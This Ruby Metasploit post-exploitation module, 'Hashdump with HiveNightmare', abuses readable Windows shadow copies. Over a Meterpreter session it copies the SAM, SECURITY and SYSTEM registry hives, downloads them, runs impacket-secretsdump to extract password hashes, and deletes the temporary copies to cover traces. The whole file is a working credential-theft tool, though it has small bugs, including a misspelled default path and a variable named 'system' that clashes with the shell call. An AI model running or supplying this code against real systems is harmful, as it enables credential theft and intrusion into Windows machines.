class MetasploitModule < Msf::Post

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Hashdump with HiveNightmare',
        'Description'   => %q{
		This module downloads the Hive Files using the exploit HiveNightmare
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'ritaban' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
    register_options(
      [
        OptString.new("PATHNAME", [ true, "Path for the sam file stored in shadow copy", "\\\\?\\GLOABLROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config"]),
        OptString.new("DSTPATH", [ true, "Path to store the downloaded files to", "/tmp/hive_files"])
      ])
  end

  def run

    print_status("Checking path existence")

    flag = false
    for i in 1..100 do
      path = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy#{i}\\Windows\\System32\\config"
      if directory?(path)
        # Copy the sam file

        sam = path + "\\SAM"
        security = path + "\\SECURITY"
        system = path + "\\SYSTEM"
        dst = datastore['DSTPATH']
        system("mkdir #{dst}")
        print_status("Reading from: #{sam}")

        username = get_env('USERNAME')

        filepath = "C:\\Users\\#{username}\\AppData\\Local\\Temp\\SAM-#{i}"
        psh_exec("Copy-Item -LiteralPath #{sam} C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\SAM-#{i}")
        client.fs.file.download("#{dst}/SAM-#{i}",filepath)

        print_status("Reading from: #{security}")

        filepath = "C:\\Users\\#{username}\\AppData\\Local\\Temp\\SECURITY-#{i}"
        psh_exec("Copy-Item -LiteralPath #{security} C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\SECURITY-#{i}")
        client.fs.file.download("#{dst}/SECURITY-#{i}",filepath)

        print_status("Reading from: #{system}")

        filepath = "C:\\Users\\#{username}\\AppData\\Local\\Temp\\SYSTEM-#{i}"
        psh_exec("Copy-Item -LiteralPath #{system} C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\SYSTEM-#{i}")
        client.fs.file.download("#{dst}/SYSTEM-#{i}",filepath)

        # Removing the moved files

        system("impacket-secretsdump -sam #{dst}/SAM-#{i} -system #{dst}/SYSTEM-#{i} -security #{dst}/SECURITY-#{i} local")
        psh_exec("rm C:\\Users\\$env:UserName\\AppData\\Local\\Temp\\*#{i}")
        flag = true
      end
      if flag == false
        print_status("No shadow copy found")
      end
    end
  end
end
